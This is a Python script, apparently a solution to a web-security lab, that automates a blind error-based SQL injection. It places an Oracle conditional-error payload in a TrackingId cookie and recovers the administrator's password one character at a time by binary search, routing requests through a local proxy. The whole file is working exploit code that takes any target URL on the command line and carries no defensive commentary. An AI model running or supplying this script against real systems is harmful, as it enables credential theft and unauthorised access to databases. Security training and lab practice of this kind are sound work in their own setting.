import sys
import urllib3
from urllib.parse import quote
import requests
import time

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {'http': '127.0.0.1:8080', 'https': '127.0.0.1:8080'}


def greater_than_mid(url, mid, i):
    sqli_payload = "' || (SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator' AND ASCII(SUBSTR(password,%s,1))>%s) || '" % (i, mid)
    cookie = {'TrackingId': 'g31CW6mjktuq8Zkd' + sqli_payload,
              'session': 'LXQW2BXQ7lzQNDgOpcUBRDV0peUiNP0i'}
    r = requests.get(url, cookies=cookie, verify=False, proxies=proxies)

    if r.status_code == 200:
        return False
    else:
        return True


def check_mid(url, mid, i):
    sqli_payload = "' || (SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator' AND ASCII(SUBSTR(password,%s,1))=%s) || '" % (i, mid)
    cookie = {'TrackingId': 'g31CW6mjktuq8Zkd' + sqli_payload,
              'session': 'LXQW2BXQ7lzQNDgOpcUBRDV0peUiNP0i'}
    r = requests.get(url, cookies=cookie, verify=False, proxies=proxies)

    if r.status_code == 200:
        return False
    else:
        return True


def sqli_password(url):
    password_extracted = ""

    for i in range(1, 21):
        l = 48
        r = 123
        while (l <= r):
            mid = (l + r)//2
            sys.stdout.write('\r' + password_extracted + chr(mid))
            sys.stdout.flush()

            if greater_than_mid(url, mid, i):
                l = mid + 1
            elif check_mid(url, mid, i):
                password_extracted += chr(mid)
                break
            else:
                r = mid - 1

        sys.stdout.write('\r' + password_extracted)
        sys.stdout.flush()


def main():
    start_time = time.time()

    print("\n[+] Retrieving administrator password...")
    sqli_password(url)

    end_time = time.time()
    elapsed_time = end_time - start_time

    print(f"\n\nThe elapsed time is {round(elapsed_time, 2)} seconds.")


if __name__ == "__main__":
    try:
        url = sys.argv[1].strip()
    except IndexError:
        print("[-] Usage: %s <url>" % sys.argv[0])
        print('[-] Example: %s "www.example.com"' % sys.argv[0])
        sys.exit(0)

    try:
        main()
    except KeyboardInterrupt:
        print("\n\n[-] Keyboard Interrupt Dectected.")
        print("[-] Exiting...")
